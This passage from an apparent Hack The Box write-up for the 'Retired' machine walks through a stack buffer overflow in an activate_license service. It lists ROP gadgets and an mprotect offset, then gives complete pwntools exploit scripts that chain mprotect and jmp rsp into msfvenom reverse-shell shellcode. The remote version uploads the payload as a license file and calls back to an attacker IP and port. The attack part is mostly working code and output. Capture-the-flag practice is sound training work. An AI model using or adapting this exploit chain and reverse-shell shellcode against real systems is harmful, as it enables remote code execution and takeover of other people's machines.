0x0000000000001813 : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000001817 : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000000012ef : pop rbp <span class="p">;</span> ret
0x000000000000181b : pop rdi <span class="p">;</span> ret
0x0000000000001819 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000001815 : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000001016 : ret
0x000000000000174f : ret 0x2bf
0x0000000000001202 : ret 0x2d
0x00000000000013b9 : ret 0x8d48
0x000000000000175d : ret 0xb70f
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>OK, we need more. First, let’s see what’s in the <code class="language-plaintext highlighter-rouge">libc</code> library:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td>
<td class="rouge-code"><pre>ROPgadget <span class="nt">--binary</span> ./libc-2.31.so <span class="nt">--only</span> <span class="s2">"pop|ret"</span>
Gadgets information
<span class="o">============================================================</span>
<span class="o">(</span> ... <span class="o">)</span>

0x0000000000027355 : pop rdi <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000026796 : pop rdi <span class="p">;</span> ret
0x00000000000f948d : pop rdx <span class="p">;</span> pop r12 <span class="p">;</span> ret
0x000000000008946a : pop rdx <span class="p">;</span> pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> ret
0x0000000000137782 : pop rdx <span class="p">;</span> pop rbx <span class="p">;</span> ret
0x00000000000e4e19 : pop rdx <span class="p">;</span> pop rcx <span class="p">;</span> pop rbx <span class="p">;</span> ret
0x00000000000cb1cd : pop rdx <span class="p">;</span> ret
0x0000000000027353 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000026794 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x000000000002890f : pop rsi <span class="p">;</span> ret
0x000000000002734f : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000026790 : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x000000000002890b : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> ret
0x000000000003dd16 : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000028488 : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> ret
0x000000000010aead : pop rsp <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000026e9b : pop rsp <span class="p">;</span> ret
0x0000000000056174 : pop rsp <span class="p">;</span> ret 0x64c0
0x00000000000d82ef : pop rsp <span class="p">;</span> ret 0x6608
0x00000000000d7f96 : pop rsp <span class="p">;</span> ret 0xeb08

<span class="o">(</span>...<span class="o">)</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>All required POP/RET gadgets are in libc, so we can use them from there:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td>
<td class="rouge-code"><pre>0x0000000000026796 : pop rdi <span class="p">;</span> ret
0x000000000002890f : pop rsi <span class="p">;</span> ret
0x00000000000cb1cd : pop rdx <span class="p">;</span> ret
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Next, we need an offset of <code class="language-plaintext highlighter-rouge">mprotect()</code>. Again, we can get it with the readelf tool:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre>readelf <span class="nt">-s</span> libc-2.31.so | <span class="nb">grep </span>mprotect                                                                                                                                                                 
  1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>And the last gadget to execute our code on a stack is <code class="language-plaintext highlighter-rouge">JMP RSP</code> - it can be found in the <code class="language-plaintext highlighter-rouge">libsqlite</code> library:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre>ROPgadget <span class="nt">--binary</span> ./libsqlite3.so.0.8.6 <span class="nt">--only</span> <span class="s2">"jmp"</span> | <span class="nb">grep </span>rsp                                                                                                                                                 
0x00000000000d431d : jmp rsp
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>We have gadgets, so let’s write a script to help us get the padding size. First, we’ll use the <code class="language-plaintext highlighter-rouge">cyclic_metasploit()</code> function from pwntools which generates the <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn sequence</a> (the Metasploit version):</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td>
<td class="rouge-code"><pre><span class="c">#!/usr/bin/env python3</span>
from pwn import <span class="k">*</span>
import <span class="nb">time

</span>context.log_level<span class="o">=</span> <span class="s2">"debug"</span>

p <span class="o">=</span> remote<span class="o">(</span><span class="s2">"127.0.0.1"</span>, 1337<span class="o">)</span>
atexit.register<span class="o">(</span>p.clean_and_log<span class="o">)</span>

<span class="c"># buffer where read() stores the data has 512 bytes, so let's try something bigger a bit</span>
payload_size <span class="o">=</span> 640
payload  <span class="o">=</span> b<span class="s2">""</span>
payload +<span class="o">=</span> p32<span class="o">(</span>payload_size, <span class="nv">endian</span><span class="o">=</span><span class="s1">'big'</span><span class="o">)</span>
payload +<span class="o">=</span> cyclic_metasploit<span class="o">(</span>payload_size<span class="o">)</span>

time.sleep<span class="o">(</span>5.0<span class="o">)</span>

p.send<span class="o">(</span>payload<span class="o">)</span>

p.interactive<span class="o">()</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Next, run the target binary in gdb (left pane on the screenshot below) and the above script (right pane):</p>
<p><a href="/assets/img/htb/retired/padding.png" class="popup img-link "><img data-src="/assets/img/htb/retired/padding.png" alt="Finding proper amount of padding" class="lazyload" data-proofer-ignore></a></p>
<p>We’ve got a match at the offset 520 in the generated pattern, so we must send 520 bytes of padding before our actual payload. With that information, we can start writing our exploit (at this moment, for localhost, we need to check if it’s working correctly):</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td>
<td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>

<span class="c1"># local
</span><span class="n">libc_base</span>       <span class="o">=</span> <span class="mh">0x7ffff7c62000</span>
<span class="n">libsqlite_base</span>  <span class="o">=</span> <span class="mh">0x7ffff7e43000</span>

<span class="n">stack_base</span>      <span class="o">=</span> <span class="mh">0x7ffffffde000</span>
<span class="n">stack_end</span>       <span class="o">=</span> <span class="mh">0x7ffffffff000</span>

<span class="n">mprotect</span>        <span class="o">=</span> <span class="mh">0x00000000001017b0</span>
<span class="n">pop_rdi</span>         <span class="o">=</span> <span class="mh">0x0000000000027725</span>
<span class="n">pop_rsi</span>         <span class="o">=</span> <span class="mh">0x0000000000028ed9</span>
<span class="n">pop_rdx</span>         <span class="o">=</span> <span class="mh">0x00000000000fdd4d</span>
<span class="n">jmp_rsp</span>         <span class="o">=</span> <span class="mh">0x00000000000aa776</span>

<span class="k">def</span> <span class="nf">prepare_shellcode</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="c1"># msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=7777 EXITFUNC=thread -f python -v shellcode
</span>    <span class="c1"># [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span>    <span class="c1"># [-] No arch selected, selecting arch: x64 from the payload
</span>    <span class="c1"># No encoder specified, outputting raw payload
</span>    <span class="c1"># Payload size: 74 bytes
</span>    <span class="c1"># Final size of python file: 432 bytes
</span>    <span class="n">shellcode</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x05\x48\x97\x48\xb9\x02\x00</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">inet_aton</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe7\x52\x57\x48\x89\xe6\x0f\x05</span><span class="sh">"</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">hexdump</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">shellcode</span>

<span class="k">def</span> <span class="nf">setup_mprotect</span><span class="p">():</span>
    <span class="c1"># setup mprotect call to make stack RWX
</span>    <span class="n">payload</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack_base</span><span class="p">)</span>              <span class="c1"># address
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rsi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack_end</span> <span class="o">-</span> <span class="n">stack_base</span><span class="p">)</span>  <span class="c1"># size
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdx</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>                       <span class="c1"># flags: R + W + X
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">mprotect</span><span class="p">)</span>    <span class="c1"># call mprotect
</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
<span class="n">atexit</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">clean_and_log</span><span class="p">)</span>

<span class="n">offset</span>    <span class="o">=</span> <span class="mi">520</span>
<span class="n">padding</span>   <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>

<span class="n">payload</span>  <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">setup_mprotect</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libsqlite_base</span> <span class="o">+</span> <span class="n">jmp_rsp</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">payload:</span><span class="se">\n</span><span class="si">{</span><span class="nf">hexdump</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="n">fake_license</span>  <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">endian</span><span class="o">=</span><span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_license</span> <span class="o">+=</span> <span class="n">payload</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">fake_license:</span><span class="se">\n</span><span class="si">{</span><span class="nf">hexdump</span><span class="p">(</span><span class="n">fake_license</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">fake_license</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>But first, test it and check if we can spawn a shell on localhost:</p>
<p><a href="/assets/img/htb/retired/test.png" class="popup img-link "><img data-src="/assets/img/htb/retired/test.png" alt="Testing exploit on localhost" class="lazyload" data-proofer-ignore></a></p>
<p>Yup, we’ve got shell! Next, we need to get actual base addresses for the <code class="language-plaintext highlighter-rouge">activate_license</code> program on the remote host and put them in our script:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre></td>
<td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>

<span class="c1"># remote
</span><span class="n">libc_base</span>       <span class="o">=</span> <span class="mh">0x7ff8f3985000</span>
<span class="n">libsqlite_base</span>  <span class="o">=</span> <span class="mh">0x7ff8f3b4a000</span>
<span class="n">stack_base</span>      <span class="o">=</span> <span class="mh">0x7ffdcae0b000</span>
<span class="n">stack_end</span>       <span class="o">=</span> <span class="mh">0x7ffdcae2c000</span>
<span class="n">mprotect</span>        <span class="o">=</span> <span class="mh">0x00000000000f8c20</span>
<span class="n">pop_rdi</span>         <span class="o">=</span> <span class="mh">0x0000000000026796</span>
<span class="n">pop_rsi</span>         <span class="o">=</span> <span class="mh">0x000000000002890f</span>
<span class="n">pop_rdx</span>         <span class="o">=</span> <span class="mh">0x00000000000cb1cd</span>
<span class="n">jmp_rsp</span>         <span class="o">=</span> <span class="mh">0x00000000000d431d</span>

<span class="k">def</span> <span class="nf">prepare_shellcode</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="c1"># msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=7777 EXITFUNC=thread -f python -v shellcode
</span>    <span class="c1"># [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span>    <span class="c1"># [-] No arch selected, selecting arch: x64 from the payload
</span>    <span class="c1"># No encoder specified, outputting raw payload
</span>    <span class="c1"># Payload size: 74 bytes
</span>    <span class="c1"># Final size of python file: 432 bytes
</span>    <span class="n">shellcode</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x05\x48\x97\x48\xb9\x02\x00</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">inet_aton</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="sh">"</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe7\x52\x57\x48\x89\xe6\x0f\x05</span><span class="sh">"</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">hexdump</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">shellcode</span>

<span class="k">def</span> <span class="nf">setup_mprotect</span><span class="p">():</span>
    <span class="c1"># setup mprotect call to make stack RWX
</span>    <span class="n">payload</span> <span class="o">=</span>  <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack_base</span><span class="p">)</span>              <span class="c1"># address
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rsi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack_end</span> <span class="o">-</span> <span class="n">stack_base</span><span class="p">)</span>  <span class="c1"># size
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdx</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>                       <span class="c1"># flags: R + W + X
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">mprotect</span><span class="p">)</span>    <span class="c1"># call mprotect
</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="n">RHOST</span> <span class="o">=</span> <span class="sh">"</span><span class="s">retired.htb</span><span class="sh">"</span>
<span class="n">LHOST</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.10.16.3</span><span class="sh">"</span>
<span class="n">LPORT</span> <span class="o">=</span> <span class="mi">5555</span>

<span class="n">offset</span>    <span class="o">=</span> <span class="mi">520</span>
<span class="n">padding</span>   <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">prepare_shellcode</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">LPORT</span><span class="p">)</span>

<span class="n">payload</span>  <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">setup_mprotect</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libsqlite_base</span> <span class="o">+</span> <span class="n">jmp_rsp</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">payload:</span><span class="se">\n</span><span class="si">{</span><span class="nf">hexdump</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">RHOST</span><span class="si">}</span><span class="s">/activate_license.php</span><span class="sh">"</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Sending request to: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">licensefile</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span> <span class="p">}</span> <span class="p">)</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Now we’re ready to run it, and…</p>
<p><a href="/assets/img/htb/retired/shell.png" class="popup img-link "><img data-src="/assets/img/htb/retired/shell.png" alt="Shell on remote host" class="lazyload" data-proofer-ignore></a></p>
<p>again, we’ve got a shell 😀</p>
<h2 id="enumeration---part-2">
<span class="mr-2">Enumeration - part 2</span><a href="#enumeration---part-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
</h2>
<p>First, we need to check what potential vulnerabilities or holes in a configuration are on this host. We can check for non-standard SUID programs with find utility, but nothing unusual exists:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td>
<td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@retired</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">perm</span> <span class="o">/</span><span class="mi">4000</span> <span class="o">-</span><span class="k">exec</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="p">{}</span> \<span class="p">;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">perm</span> <span class="o">/</span><span class="mi">4000</span> <span class="o">-</span><span class="k">exec</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="p">{}</span> \<span class="p">;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">44</span><span class="n">K</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2020</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">63</span><span class="n">K</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2020</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">58</span><span class="n">K</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2020</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">35</span><span class="n">K</span> <span class="n">Feb</span> <span class="mi">26</span>  <span class="mi">2021</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">87</span><span class="n">K</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2020</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">71</span><span class="n">K</span> <span class="n">Jan</span> <span class="mi">20</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
